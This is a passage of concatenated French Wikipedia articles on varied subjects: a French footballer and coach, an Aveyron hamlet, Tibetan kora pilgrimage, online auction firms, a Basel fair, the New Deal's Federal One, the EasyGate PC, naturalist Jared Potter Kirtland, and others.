Au départ de Bernard Caron, il s'impose en défense centrale aux côtés de Carlos Curbelo et dispute la première campagne européenne de l'AS Nancy-Lorraine en 1979. Après une victoire face au Frem Copenhague, les Nancéiens sont éliminés en huitième de finale par le Servette Genève. Onzième en fin de saison, l'AS Nancy-Lorraine perd son maître à jouer Michel Platini et dispute les saisons suivantes dans la première partie du tableau. Avec ses coéquipiers, Jean-Claude Cloët participe de nouveau à une finale en en coupe d'été, compétition organisée par la Ligue de football professionnel lors de la Coupe du monde 1982. L'AS Nancy-Lorraine s'incline sur le score de trois à deux face au Stade lavallois. Il quitte le club nancéien sur cette finale après 199 matchs et 4 buts en division 1.
Jean-Claude Cloët rejoint en 1982, l'AS Cannes qui évolue en division 2. Il dispute deux saisons avec le club azuréen avant de rejoindre le CO Saint-Dizier en division 3. Le club termine deuxième du groupe Est à trois points du FC Chaumont et rate ainsi l'accession à l'échelon supérieur. Il met alors fin à sa carrière de joueur après vingt-sept rencontres pour un but marqué et retourne à l'AS Nancy-Lorraine pour prendre en charge le centre de formation et l'équipe B.
Entraîneur.
Jean-Claude Cloët reste trois ans à la tête du centre de formation du club nancéien avant de rejoindre en 1988 l'US Gravelines qui évolue en division d'honneur du Nord. Pour sa première saison, le club termine deuxième à un point de l'équipe réserve de USL Dunkerque. L'année suivante, les joueurs de Jean-Claude Cloët remportent le championnat avec huit points d'avance sur le deuxième et accède ainsi à la division 4. Le club confirme lors de la saison 1990-1991 en remportant le groupe A de division 4 avec la meilleure attaque et la deuxième meilleure défense. Après deux montées successives, l'US Gravelines est proche de monter en division 2 en terminant troisième du groupe Nord de division 3 en 1992 à quatre points de l'US Créteil. Neuvième du championnat en 1993, Jean-Claude Cloët quitte alors le club gravelinois pour signer au Calais RUFC, autre club de division 3.
Il ne reste qu'une saison au CRUFC qu'il quitte sur une huitième place dans le groupe A de National 2. Après une année sabbatique, il rejoint en 1995 le Lille OSC comme conseiller technique. Après une saison à ce poste, il reste sans emploi pendant un an avant d'être engagé comme adjoint de Moussa Bezaz à la SAS Épinal en 1997-1998. En fin de saison, le club spinalien doit déposer son bilan et Jean-Claude Cloët se retrouve de nouveau sans club. En 1999, il devient directeur technique de l'Étoile filante bastiaise et exerce ce poste jusqu'en 2003.
En 2003, il est appelé par Ladislas Lozano pour devenir son adjoint au Stade de Reims qui vient de descendre en National et il signe un contrat de deux ans. Lozano déclare alors à propos de son adjoint, . Le Stade remporte le championnat National en fin de saison et retrouve la ligue 2 un an après l'avoir quitté. La saison suivante, le club rémois fait un bon début de saison puis enchaîne les contre-performances et en , Ladislas Lozano est démis de ses fonctions, Jean-Claude Cloët devenant alors entraîneur en chef. Il réussit à relancer l’équipe et à obtenir le maintien en ligue 2 lors de la dernière journée du championnat mais, il n'est pas conservé à son poste, Thierry Froger lui succédant.
Jean-Claude Cloët retrouve un poste d'entraîneur en à l'AS Vescovato/Folelli, club de division d'honneur de la ligue Corse en remplacement de Paul Squaglia. Il rejoint ensuite l'AS de la Costa Verde, toujours en Haute-Corse pour une saison avant d'entraîner en 2009-2010 la réserve du Gallia Club de Lucciana.
Palmarès.
Jean-Claude Cloët dispute 199 rencontres pour 4 buts marqués en division 1 et 66 matchs en division 2 pour 2 buts inscrits. Avec l'US Valenciennes-Anzin, il est vainqueur du groupe A et vice-champion de France de division 2 en 1975. Sous les couleurs nancéiennes, il remporte la Coupe de France en 1978 avec l'AS Nancy-Lorraine et finaliste de la Coupe d'été en 1982.
Avec l'équipe de France amateur, il est médaille d'argent des Jeux méditerranéens en 1975.
Comme entraîneur, il remporte le championnat de division d'honneur du Nord en 1990 puis, en 1991, le groupe A de division 4 avec l'US Gravelines.
Statistiques.
Le tableau ci-dessous résume les statistiques en match officiel de Jean-Claude Cloët durant sa carrière de joueur professionnel.

</doc>
<doc id="1873675" url="https://fr.wikipedia.org/wiki?curid=1873675" title="La Vinzelle">
La Vinzelle

La Vinzelle est un hameau de l’Aveyron, administrativement rattaché à la commune de Grand-Vabre.
Situation géographique.
La Vinzelle, village pittoresque perché sur un éperon rocheux, situé sur la vallée du Lot, en Aveyron près de Conques.
Ce petit hameau sur la vallée du Lot, près de Conques, est situé sur le territoire de l'ancienne commune de Grand-Vabre, aujourd'hui rattachée à la commune de Conques-en-Rouergue.
En période hivernale, douze habitants maintiennent la vie du village. Grâce à eux et à l'Association des amis de La Vinzelle, le village a su garder son authenticité et son charme. 
Toponymie.
Pour certains, "Vinzelle" proviendrait de "vinum" (vin) et de "cella" (cave), d'où "vincella" en bas latin.
Toutefois, "Lou Tresor dóu Felibrige" indique : .
À la suite de Mistral, Ernest Nègre indique une origine occitane : .
Histoire.
Ce hameau de la commune de Grand-Vabre dans l'Aveyron était une importante place forte du Rouergue à la frontière de l'Auvergne et avait au pour co-seigneurs le prince de Monaco et le commandeur Hospitalier de Narbonne.
La Vinzelle se situait sur une voie de pèlerinage vers Saint-Jacques-de-Compostelle. L’une des portes d’accès de Conques porte d’ailleurs son nom.
Le village était autrefois important, et possédait un château, disparu au lors des Guerres de religion.
Tourisme.
Village fleuri particulièrement pittoresque, avec un beau point de vue sur le Lot, La Vinzelle, bien que moins connue que sa voisine Conques, accueille un grand nombre de visiteurs chaque année, notamment des randonneurs.

</doc>
<doc id="1873680" url="https://fr.wikipedia.org/wiki?curid=1873680" title="Kora (pèlerinage)">
Kora (pèlerinage)

Une kora () est, dans le bouddhisme tibétain et la tradition Bön, un rituel qui consiste à tourner autour d'un lieu de rite lors d'un moment important.
Un pèlerinage circumambulatoire se déroule autour d'un lieu naturel (montagne, lac ou grotte) ou d'un lieu construit par la main de l'homme (monastère, temple ou ville).
Le terme "Kora" est souvent associé au concept de faire le pèlerinage dans le monde tibétain.
Définitions.
Le mot tibétain pour pèlerin est « celui qui tourne autour d'un lieu saint » (tibétain : གནས་སྐོར་བ, Wylie: "gnas skor ba" Phonétique simplifiée THL : "nekorwa"). Il renvoie directement à la circumambulation autour de lieux sacrés, pratique religieuse essentielle des laïcs leur permettant d'acquérir des mérites pour espérer une meilleure renaissance dans le cycle du samsara. Il existe plusieurs catégories de lieux saints, « "né »" ou « n"échen »" (tibétain : གནས་ཆེན, Wylie : "gnas chen").
Une "kora" peut être un site naturel (montagne, lac, grotte). Il existe ainsi des pèlerinages autour de montagnes considérées comme sacrées, comme le mont Kailash, le Khawa Karpo ou l'Amnye Machen. Avant l’introduction du bouddhisme au Tibet, les montagnes constituaient déjà une composante essentielle du paysage religieux avec le culte des « divinités-montagnes ». Le bouddhisme a donc intégré cette croyance. Les lacs sacrés les plus connus sont le lac Manasarovar, le lac Qinghai (tibétain : མཚོ་སྔོན་པོ་, Wylie : "mtsho-sngon-po",THL : "Tso Ngönpo"), le lac Yamdrok et le Lac Namtso.
Une kora peut être un lieu construit par l'homme, comme une ville, un monastère ou un stupa. Ainsi, trois circuits de circumambulation existent à Lhassa : le « circuit » intérieur ("nangkor") entoure le bâtiment principal du Jokhang, le « circuit médian » ("barkhor") encercle l’ensemble des bâtiments du Jokhang et le « "circuit extérieur » » ("lingkhor") englobe la ville et le Potala.
Le « pays caché » ou beyül (Wylie : "sbas yul)") est une vallée isolée que Padmasambhava, l’introducteur du bouddhisme tantrique au , aurait cachée. Les hommes sont supposés y trouver refuge en cas de danger.
Une personne sainte peut elle-même être considérée comme un « lieu saint ("né") et faire l'objet d'une circumambulation.
Le pèlerinage est généralement une pratique collective dans le monde tibétain. Un groupe de personnes laïques, d’une même famille ou d’un même village, accompagnées souvent de moines ou de lamas s’organise. La circumambulation s’effectue à pied. Les mérites obtenus sont supérieurs à ceux obtenus à dos de cheval.
Origines et histoire.
L’acte rituel de circumambulation est historiquement attestée dès la période royale avec la construction d'un déambulatoire autour des temples entre le et le . Les pèlerinages autour des montagnes sacrées sont la conséquence de la bouddhicisation de montagnes sacrées non-bouddhiques.
Après la politique antireligieuse menée pendant la révolution culturelle (1966-1976), la pratique des pèlerinages a repris dans les années 1980 avec une libéralisation de la politique religieuse.
Koras renommées.
Le Kailash.
Ainsi les pèlerins effectuent une longue circumambulation de plusieurs jours autour de la montagne sacrée de Kailash au Tibet. La circumambulation du Kailash s'effectue traditionnellement en dix-sept heures, dans le sens des aiguilles d'une montre pour les bouddhistes et les hindouistes, mais dans le sens contraire dans la religion bön. Chaque journée se termine dans un lieu chargé de spiritualité. La marche est difficile. Ainsi le passage du col de Dolma, à plus de mètres d'altitude, est une épreuve que certains ne peuvent pas réussir. « Le sens et la valeur inestimable de la vie sont alors palpables ». Chaque instant de l'ascension demande un effort, un dépassement de soi. L'acte si anodin de respirer trouve ici tout son prix, « chaque respiration peut être la dernière, chaque geste peut être le dernier ». L'offrande déposée au col est l'ultime don fait aux divinités pour les remercier d'être en vie.
L'Amnye Machen.
Autre exemple dans la préfecture autonome tibétaine de Golog du Qinghai, l'Amnye Machen considéré comme la résidence de "Machen Pomra", la plus grande divinité locale. La montagne est un dieu du terroir. Il lui est rendu hommage, ainsi qu'aux trois cent soixante dieux secondaires dont il est le chef, par de nombreux pèlerins qui parcourent les quelque du circuit de circumambulation autour du mont. Avant l'administration chinoise de la région, ils étaient chaque année près de à effectuer ce pèlerinage mais ce pèlerinage perdure. L'anthropologue Katia Buffetrille y a effectué quatre circumambulations en 1990, 1992, 2002 et 2018. En , elle précise que les pèlerins l'effectuent en à pied, en à cheval ou en s'ils se prosternent. Cependant, le pèlerinage a évolué du fait de la modernisation (une nouvelle route y a été construite), de la sinicisation, du tourisme et de la bouddhicisation.

</doc>
<doc id="1873682" url="https://fr.wikipedia.org/wiki?curid=1873682" title="Ricardo.ch">
Ricardo.ch

Ricardo Groupe (Ricardo-Gruppe en Allemand) est spécialisé dans l'acquisition et le développement de sites européens de vente C2C &amp; B2C (prix fixes, enchères ou petites annonces). La société est une entité de Tamedia.
Historique.
La société est fondée initialement sous le nom ricardo.de le par Stefan Glänzer, Christoph linkwitz et Stefan Wiskemann. Elle atteint une capitalisation boursière de 1.8 Milliard d'euros au printemps 2000. En , la société anglaise QXL.com (qui deviendra Tradus en 2008) acquiert 90 % du capital social de ricardo.de AG. Le groupe change alors de nom pour QXL Ricardo Plc.
Dans le même temps, des sites aux activités similaires voient le jour dans d'autres pays tels que Aucland.fr en France, auktion24.ch en suisse avant d'être rachetés par le groupe entre 1999 et fin 2007.
Le , après une nette progression du prix de son action, la société annonce être approchée par un acheteur potentiel dont le nom reste inconnu. Des spéculations sont relayées au travers de la presse jusqu'en mi-décembre où le nom de la société Naspers apparait comme la candidate la plus probable du rachat pour £17 par action soit un montant total de £750 millions.
Courant 2013, le groupe change une nouvelle fois de nom et s'appelle ainsi Ricardo Groupe (ricardo-Gruppe). Parmi les sociétés ou domaines d'activité stratégiques actuellement représentés par le groupe, on distingue ricardo.ch, ricardoshops.ch, olx.ch (anciennement ricardolino.ch), auto.ricardo.ch, ricardo.gr, trendsales.dk et 7pixel.it.
L’entreprise emploie environ 300 personnes dont 140 à son siège social de Zoug mais également en France à Sophia-Antipolis et en Ukraine à Kiev, ses centres de développement.
Ricardo.ch.
L'entreprise ricardo.ch SA est une société suisse créée en sous le nom d'auktion24.ch à Baar (ZG). Avec deux millions de membres, presque trois millions d’articles en vente et un volume d’affaires dépassant les 660 millions de francs suisses (490 millions d’euros de transactions entre membres) par an, le site ricardo.ch du groupe ricardo se positionne dans le top 10 des sites par fréquentation (source Alexa au 04/2014).
Références.
__FORCERSOMMAIRE__

</doc>
<doc id="1873683" url="https://fr.wikipedia.org/wiki?curid=1873683" title="QXL Ricardo">
QXL Ricardo

Le groupe QXL Ricardo fut l'une des grandes sociétés européennes de ventes aux enchères sur Internet qui rivalisèrent avec eBay sur le marché européen.
Ce groupe est né de la fusion en mai 2000 du britannique QXL avec l'allemand Ricardo. Son siège social se trouvait à Londres et le titre était coté à la bourse de Londres jusqu'au , date à laquelle le groupe fut acquis par pour un montant total de £946m.
À cette date, le groupe change son nom en Ricardo Groupe (ricardo-Gruppe) et prend la direction des filiales européennes. Toutefois, la direction de la partie polonaise est confiée directement à MIH, filiale de .

</doc>
<doc id="1873684" url="https://fr.wikipedia.org/wiki?curid=1873684" title="Château de joux">
Château de joux



</doc>
<doc id="1873688" url="https://fr.wikipedia.org/wiki?curid=1873688" title="Basler Herbstmesse">
Basler Herbstmesse

La Basler Herbstmesse est une fête foraine annuelle qui se tient dans la ville de Bâle, en Suisse. Elle fait partie des traditions vivantes de Suisse.
Historique.
La tradition de cette foire remonte au Moyen Âge lorsque, sur l'avis du concile de Bâle, l'empereur Frédéric III accorde à la ville de Bâle en 1471 le droit de tenir deux grandes foires commerciales par an, l'une avant Pentecôte et l'autre en automne, avant le jour de la Saint-Martin.
Alors que la foire de printemps n'a connu qu'une brève existence, celle d'automne s'est tenue chaque année sans interruption, devenant ainsi la plus ancienne foire de Suisse et la plus importante entre Stuttgart et Milan.
Déroulement.
Appelée "d'Herbschtmäss" ou plus simplement "d'Mäss" en suisse allemand, cette fête se déroule, comme son nom l'indique, chaque année au début de l'automne ("Herbst" signifiant "automne" en allemand).
La foire débute traditionnellement le dernier samedi du mois d'octobre et est annoncée à midi pile par les cloches de l'église Martinskirche qui ouvrent les célébrations sur six places différentes de la ville. C'est également le signal de l'ouverture des étals du marché de la "Petersplatz" et de la foire à la Mustermesse Basel. Pendant les seize jours suivants, la foule envahit les quartiers du centre de la ville pour profiter des stands, des manèges et des vendeurs de bonbons et de sucreries placés près des ronds-points.
C'est lors de cette foire que sont vendus les "Mässmogge" ("Mäss" venant de la messe et "Mogge" signifiant morceau), célèbres confiseries bâloises.

</doc>
<doc id="1873689" url="https://fr.wikipedia.org/wiki?curid=1873689" title="Record du monde de natation dames du 100 mètres 4 nages">
Record du monde de natation dames du 100 mètres 4 nages

Progression du record du monde de natation sportive dames pour l'épreuve du 100 mètres 4 nages (en bassin de 25 mètres uniquement).

</doc>
<doc id="1873692" url="https://fr.wikipedia.org/wiki?curid=1873692" title="Federal One">
Federal One

Federal One (ou Federal Project Number One) était le nom générique d'un groupe de projets culturels mis en place par la Work Projects Administration, dans le cadre du New Deal, dans les États-Unis des années 1930. L'objectif était de soutenir l'activité des créateurs et des écrivains pendant la Grande Dépression.
Les programmes.
Les cinq programmes étaient :
Le Federal Theatre Project devait créer cinq théâtres nationaux dans les villes de New York, Los Angeles, Chicago, Boston et La Nouvelle-Orléans. Il subventionna des pièces de théâtre, dont les thèmes furent parfois contestés.
Le Federal Writers' Project a permis de lancer la carrière d'écrivains comme John Huston ou Arthur Miller. 
"Federal One" s'interrompit avec la Seconde Guerre mondiale : le Congrès américain vota sa suppression le .

</doc>
<doc id="1873693" url="https://fr.wikipedia.org/wiki?curid=1873693" title="Kora (homonymie)">
Kora (homonymie)

kora peut désigner :

</doc>
<doc id="1873698" url="https://fr.wikipedia.org/wiki?curid=1873698" title="Bandstand">
Bandstand



</doc>
<doc id="1873715" url="https://fr.wikipedia.org/wiki?curid=1873715" title="Rue de Mouzaïa">
Rue de Mouzaïa

La rue de Mouzaïa est une voie située dans le quartier Amérique du de Paris.
Situation et accès.
Située juste au-dessus du parc des Buttes-Chaumont, cette rue dessert de part et d'autre une série d'allées flanquées de maisonnettes et jardins, les villas de la Mouzaïa, ainsi que le hameau du Danube, l'ensemble constituant ce qui est parfois appelé « le quartier de la Mouzaïa ». 
On trouve ainsi sur le côté sud de la rue les villas d'Alsace, Eugène-Leblanc, Émile-Loubet, de Bellevue, des Lilas, Sadi-Carnot et Félix-Faure, et sur son côté nord, celles du Progrès et de la Renaissance.
Origine du nom.
Cette voie tient son nom du col de Mouzaïa, dans l'actuelle wilaya de Blida en Algérie, en raison des combats qui y eurent lieu lors de la conquête de l'Algérie par la France en 1830 entre le général Clauzel et les troupes du bey de Tittery, Mustapha-Ben-Mezrag, puis en 1839-1840 entre le général Lamoricière et les troupes d'Abd el-Kader.
Historique.
Classée par un décret du depuis la rue du Général-Brunet et un point situé à en deçà de la rue des Lilas, cette voie est prolongée entre cette dernière voie et le boulevard Sérurier par un décret du . 
La rue ne bénéficie pas des travaux d'aménagements des années 1960 puisque le sol est en partie friable. En effet, il s'agit d'anciennes carrières, sur lesquelles ne peuvent pas être érigés des immeubles d'habitations.

</doc>
<doc id="1873717" url="https://fr.wikipedia.org/wiki?curid=1873717" title="Dialogue de sourds (film)">
Dialogue de sourds (film)

Dialogue de sourds est un court-métrage de Bernard Nauer.
Synopsis.
Les deux frères Cérébos, l'un paraplégique, l'autre aveugle, viennent de gagner, grâce à un jeu-concours, un fabuleux voyage pour une personne.
Problème : qui partira ?

</doc>
<doc id="1873719" url="https://fr.wikipedia.org/wiki?curid=1873719" title="Louise Karlsson">
Louise Karlsson

Louise Karlsson, née le à Uddevalla, est une nageuse suédoise, spécialiste de la brasse et des courses de 4 nages. Elle a participé aux Jeux olympiques d'été de 1992 et de 1996 et son meilleur résultat fut de finir au 200 m 4 nages des Jeux olympiques de 1996. Elle fut détentrice du record du monde du 100 m 4 nages pendant un an, avec le temps de 1 min 1 s 03 établi en janvier 1997.

</doc>
<doc id="1873722" url="https://fr.wikipedia.org/wiki?curid=1873722" title="Les Nouvelles Aventures de Spirou et Fantasio">
Les Nouvelles Aventures de Spirou et Fantasio



</doc>
<doc id="1873726" url="https://fr.wikipedia.org/wiki?curid=1873726" title="EasyGate">
EasyGate

L'EasyGate est un PC simplifié fonctionnant sous EasyOS qui permet d'effectuer la plupart des opérations courantes nécessitant un ordinateur (navigation Web, traitement de texte, retouche d'images...), le tout de manière plus intuitive que sur un PC traditionnel.
Lancé en 2006, sa commercialisation a cessé en , après le rachat de Neuf Cegetel par SFR.
Objectif.
L'idée est de fournir une solution libre tout-en-un (PC + modem-routeur), destinée aux réfractaires à l'informatique, qui peuvent ainsi disposer d'un accès à Internet chez eux, sans procédures complexes.
En particulier, la laborieuse configuration d'une "*-box", ainsi que celle d'un ordinateur pour surfer sur le web sont épargnées à l'utilisateur, puisque les deux éléments sont intégrés l'un à l'autre, et préconfigurés pour une connexion ADSL chez Neuf Telecom.
Technologie.
La technologie employée est standard, reposant sur une architecture matérielle x86 : le processeur est un Intel Celeron M360, le disque dur est une mémoire flash de 512 Mio ; la mémoire vive est de 512 Mio. Dotées de ports Ethernet et USB, l'EasyGate permet de connecter un réseau domestique et des périphériques classiques tels qu'un disque dur externe.
L'OS, entièrement libre, pèse au total moins de 100 Mio en mémoire flash.
Possibilités d'extensions.
Enfin, l'EasyGate a été conçue pour être extensible par le biais de modules empilables ; ainsi l'intégration d'un lecteur DVD ou d'un disque dur classique sont envisageables, bien qu'il soit d'ores et déjà possible d'adjoindre les périphériques USB correspondants.
OpenGate.
Une version similaire, l'OpenGate, est proposée pour les membres de la communauté de développement de l'EasyGate, ainsi que pour les utilisateurs confirmés.
En effet, contrairement à l'EasyGate, l'OpenGate ne contient aucune restriction (accès root, possibilité d'installer des logiciels ou de modifier la configuration du modem-routeur, etc.). Inversement, le bon fonctionnement du système n'est plus 100 % garanti, comme pour l'EasyGate.
Sur l'OpenGate, il est d'ailleurs tout à fait possible d'installer un autre système d'exploitation que celui pré-installé, ceci afin de la transformer, par exemple, en serveur léger.
Événements.
L'EasyGate a obtenu le "prix spécial du jury" aux Lutèces d'Or 2007.

</doc>
<doc id="1873728" url="https://fr.wikipedia.org/wiki?curid=1873728" title="Jared Potter Kirtland">
Jared Potter Kirtland

Jared Potter Kirtland, né le à Wallingford (Connecticut) et mort le à Rockport, aujourd'hui un village annexé à Cleveland, est un médecin, horticulteur et naturaliste américain.
Biographie.
Il est le fils aîné de Turhand Kirtland et de Mary née Potter. Sa famille s’installe dans l’Ohio alors qu’il avait dix ans. Son grand-père maternel, le médecin Jared Potter (1742-1810), l’initie à l’histoire naturelle. Il possédait de plus un verger qui permet au jeune Kirtland de se livrer à de nombreuses observations sous sa conduite (comme sur la greffe des arbres fruitiers, les abeilles et leurs ennemis, la reproduction du ver à soie). À dix-sept, son grand-père meurt et lui lègue un confortable héritage ainsi que sa bibliothèque.
Kirtland retourne à Wallingford où il commence à étudier la médecine auprès de médecins locaux. Il reçoit également des leçons privées de deux amis de son grand-père au Yale College (aujourd’hui université Yale) : le botaniste Eli Ives (1779-1861) et le minéralogiste et géologue Benjamin Silliman (1779-1864). Ces trois hommes exercent une profonde influence sur la carrière scientifique de Kirtland.
Sans souci financier, Kirtland décide partir étudier la médecine à l’université d'Édimbourg mais la guerre de 1812 empêche ce projet. Il part alors à la nouvelle École de médecine de l’université Yale qui venait d’être créée par Nathan Smith (1762-1829) en 1810 dont il est le premier étudiant immatriculé. Il passe l’année 1813-1814 à l’université de Pennsylvanie où il suit les cours du botaniste Benjamin Smith Barton (1766-1815). Il retourne à Yale en 1814 et est fait, l’année suivante, à 21 ans, docteur en médecine.
Kirtland se marie et retourne exercer à Wallingford. Cinq ans plus tard, il s’installe à Durham (Connecticut) mais en 1823 sa femme et son second enfant meurt. Il rejoint son père à Poland (Ohio) où ce dernier a développé d’importantes affaires commerciales et envisage d’abandonner son activité médicale, idée à laquelle il finit de renoncer et il se remarie deux ans plus tard.
Il s’intéresse à la faune et à la flore de la région, notamment aux bivalves de la rivière Mahoning ce qui lui permet de démontrer, en 1829, que ces mollusques ont des sexes séparés et ne sont pas hermaphrodites comme on le pensait alors. Cette observation paraît en 1834 dans "American Journal of Science". Il fait paraître, en 1840, la description du byssus qui permet aux bivalves de se fixer au substrat. Ces découvertes lui valent une notoriété nationale et internationale. Kirtland fonde un verger à Poland dans l’Ohio et commence à faire paraître des articles d’horticulture à partir de 1831.
Il exerce diverses activités politiques notamment pour réformer le système pénitentiaire de l’État. Inauguré en Caroline du Sud 1823, un service de recherche géologique est fondé dans l’État de l’Ohio en 1836-1837. Kirtland reçoit la charge de la zoologie et finance personnellement ses assistants. Les recherches entreprises permettent d’établir une liste de 585 espèces de vertébrés ainsi que sur les poissons de l’État. Il décrit en 1840, un ver parasite des reins des porcs, observé pour la première fois aux États-Unis d'Amérique.
En 1837, Kirtland s’installe à Rockport, près de Cleveland et enseigne de novembre à mars la médecine à Cincinnati. En 1840, il rejoint la Willoughby Medical School, ce qui lui permet de passer plus de temps à Rockport où il a fondé un verger afin de continuer ses travaux horticoles. Kirtland et plusieurs de ses collègues de Willoughby démissionnent pour fonder la Cleveland Medical School (aujourd’hui la réputée école de médecine de l'université Case Western Reserve).
Kirtland participe participe à la fondation de la Cleveland Academy Natural Sciences (connu aujourd’hui comme la Kirtland Society of Natural Sciences). Cette société active dans de nombreux domaines d’histoire naturelle comme la zoologie, la botanique, la géologie, la paléontologie, la minéralogie et la météorologie, est l’ancêtre du Cleveland Museum of Natural History. Kirtland est par ailleurs membre de diverses sociétés savantes comme la Boston Society of Natural Sciences, l’American Society of Geology and Natural History, l’Association américaine pour l'avancement des sciences, l’Academy of Natural Sciences of Philadelphia ou l’American Conchological Society. Il est également membre de sociétés d’agronomie ou d’horticulture.
Il joue un rôle important dans la vie de Cleveland et participe aux travaux du comité qui installe l’eau courante dans la ville. Après la guerre civile américaine, il participe à la fondation de cours agricoles et à l’origine d’une école d’agronomie (aujourd’hui université de l'État de l'Ohio). Il prend sa retraite comme médecin en 1864 et se consacre dès lors entièrement à l’horticulture et l’histoire naturelle.
Kirtland est l’auteur d’environ soixante-dix publications sur les sujets les plus variés comme les vers parasites, les mollusques, les lépidoptères, les hyménoptères, les poissons, les reptiles et les mammifères. Ce sont surtout les poissons et les oiseaux qui l’intéressent. Il contribue également à la popularisation des connaissances scientifiques par la participation à des journaux comme le "Family Visitor" (qu’il dirige à partir de 1850), l’"Ohio Cultivator" ou l’"Ohio Farmer".

</doc>
<doc id="1873734" url="https://fr.wikipedia.org/wiki?curid=1873734" title="Officiels (hockey sur glace)">
Officiels (hockey sur glace)



</doc>
<doc id="1873740" url="https://fr.wikipedia.org/wiki?curid=1873740" title="Ordinateur Atanasoff–Berry">
Ordinateur Atanasoff–Berry



</doc>
<doc id="1873741" url="https://fr.wikipedia.org/wiki?curid=1873741" title="Liste des œuvres d'art du métro de Bruxelles">
Liste des œuvres d'art du métro de Bruxelles

Cet article recense les œuvres d'art du métro de Bruxelles, en Belgique.
Généralités.
Les stations de métro de Bruxelles sont décorées d'environ d'art. L'intégration d'œuvres d'art dans le métro bruxellois répond à une recherche d'humanisation d'endroits de passage à priori peu conviviaux. Au départ, la sélection des œuvres d'art dans le métro était une compétence du ministère national des Communications, qui créa en 1969 une commission artistique du métro, composée de trois membres. Lors de la régionalisation, elle a été remplacée par la Commission Artistique des Infrastructures de Déplacement (CAID), composée de douze membres. Son rôle consiste non seulement à assurer la sélection des œuvres, mais aussi à obtenir l'accord des autorités, négocier les contrats, assister les artistes. À ces tâches viennent s'ajouter l'entretien et la rénovation des œuvres.
Il convient de souligner que les stations n'ont évidemment pas été conçues dans le but de servir d'écrin à l'œuvre d'art. Les artistes ont donc dû s'adapter à des contraintes fixées par les ingénieurs et les architectes, même si la commission s'est efforcé d'arriver à un dialogue entre les intervenants.
Compte tenu du fait que le nombre de stations est limité et qu'un choix comporte toujours une part de subjectivité, « tout amateur d'art doit admettre que la commission a bien travaillé et a constitué un aperçu représentatif de l'art belge contemporain. En toute objectivité, on peut même dire que le patrimoine artistique contemporain de Bruxelles est plus riche en sous-sol qu'en surface. ».

</doc>
<doc id="1873752" url="https://fr.wikipedia.org/wiki?curid=1873752" title="Bill Tidy">
Bill Tidy

William Edward Tidy, dit Bill Tidy, né le à Liverpool et mort le , est un auteur de bandes dessinées britannique.
"The Fosdyke Saga".
Bill Tidy est surtout connu en France pour sa série "The Fosdyke Saga", parue initialement dans le "Daily Mirror" dans les années 1970-1980, et traduite dans "Charlie Mensuel" à la même époque.
Cette longue série racontait les histoires rocambolesques d'un famille d'industriels à travers le monde. Elle se voulait une parodie de la série télévisée "La Dynastie des Forsyte". Chaque épisode, commençait en guise de résumé, par la phrase 

</doc>
<doc id="1873753" url="https://fr.wikipedia.org/wiki?curid=1873753" title="The Fosdyke Saga">
The Fosdyke Saga

 est une bande dessinée britannique du dessinateur Bill Tidy, publiée dans le "Daily Mirror" de à .
Cette œuvre est une parodie de la série de romanesque de John Galsworthy, la "La Dynastie des Forsyte".

</doc>
<doc id="1873759" url="https://fr.wikipedia.org/wiki?curid=1873759" title="Basile-Antoine Moreau">
Basile-Antoine Moreau



</doc>
<doc id="1873761" url="https://fr.wikipedia.org/wiki?curid=1873761" title="Petar et Branko Krstić">
Petar et Branko Krstić

Petar et Branko Krstić, appelés aussi les frères Krstić (en serbe cyrillique : ; en serbe latin : ) sont deux architectes serbes du . Travaillant en collaboration, ils ont créé une œuvre influencée par l'architecture nationale serbe et, notamment, par le style néo-byzantin ; ils figurent également parmi les promoteurs du mouvement moderne en Serbie.
Éléments biographiques.
Petar Krstić (en serbe cyrillique : ) est né à Belgrade en 1899 et mort à Belgrade en 1991. Il a été professeur à la Faculté d'architecture de l'université de Belgrade. Il a écrit un ouvrage en deux tomes intitulé "Constructions architecturales" (Arhitektonske konstrukcije).
Son frère Branko est né à Belgrade en 1902 et mort à Belgrade en 1978.
Les frères ont vécu 5 rue "Kralja Milutina", dans une maison construite par Jovan Ilkić dans un style académique serbe, mêlé d'éléments Sécession.

</doc>
<doc id="1873763" url="https://fr.wikipedia.org/wiki?curid=1873763" title="Petar et Branko Krstic">
Petar et Branko Krstic



</doc>
<doc id="1873766" url="https://fr.wikipedia.org/wiki?curid=1873766" title="Waggis">
Waggis

 
Le Waggis (en suisse allemand "Wackes") est une figure traditionnelle bâloise et mulhousienne servant à caricaturer les paysans du Haut-Rhin alsaciens.
Historique.
La première mention de "Waggis" remonte à 1870. Il désigne alors familièrement les Alsaciens travaillant dans la ville de Bâle et qui, ne pouvant ramener leur salaire chez eux, avaient la réputation de boire sur place une bonne partie de leur argent.
De nos jours, cette figure est utilisée lors du carnaval de Bâle, du carnaval de Mulhouse ainsi que dans d'autres carnavals plus modestes (Guewenheim, Riedisheim), où le "Waggis" est représenté sous le costume traditionnel des agriculteurs alsaciens : chemise bleue, pantalon blanc, foulard rouge, col blanc, sabots de bois et, parfois, un béret. Il porte comme accessoires la cocarde tricolore française à l'occasion accompagnée de légumes, voire un os. Le masque du Waggis se reconnaît grâce à son grand sourire laissant apparaître une denture imposante, mais aussi par sa chevelure importante et ébouriffée, souvent de couleur jaune paille. Cependant, l'élément le plus visible reste le nez, énorme et de couleur rouge, rappel de la réputation de bons vivants des "Waggis".

</doc>
<doc id="1873767" url="https://fr.wikipedia.org/wiki?curid=1873767" title="Création littéraire">
Création littéraire

La Création littéraire (de l’anglais : « creative writing ») est une méthode d’écriture enseignée dans les universités anglophones et .
Enseignement en France.
Formations dédiées.
La pédagogie des universités françaises reste centrée sur l’analyse des textes, mais des exceptions émergent, et après des décennies d'expériences sous forme d'ateliers optionnels, des formations diplômantes de second cycle ont fini par apparaître dans plusieurs endroits de France, presque simultanément. Début 2023, il existait 8 masters en création littéraire dans l'hexagone.

</doc>
<doc id="1873768" url="https://fr.wikipedia.org/wiki?curid=1873768" title="Petar Krstić">
Petar Krstić



</doc>
<doc id="1873770" url="https://fr.wikipedia.org/wiki?curid=1873770" title="Petar Krstic">
Petar Krstic



</doc>
<doc id="1873771" url="https://fr.wikipedia.org/wiki?curid=1873771" title="Arcadia (littérature)">
Arcadia (littérature)

Arcadia est un diptyque de fantasy écrit par Fabrice Colin et publié en 1998. Le premier tome, "Vestiges d'Arcadia" est paru aux éditions Mnémos en ; le deuxième tome, "La Musique du sommeil" est paru aux mêmes éditions en .
Il n'y a pas eu d'autre édition. On peut considérer ce livre comme une uchronie de l'époque victorienne où la magie existe, où la Reine Victoria se serait entourée de poètes et d'artistes comme ministres.
Caractéristiques.
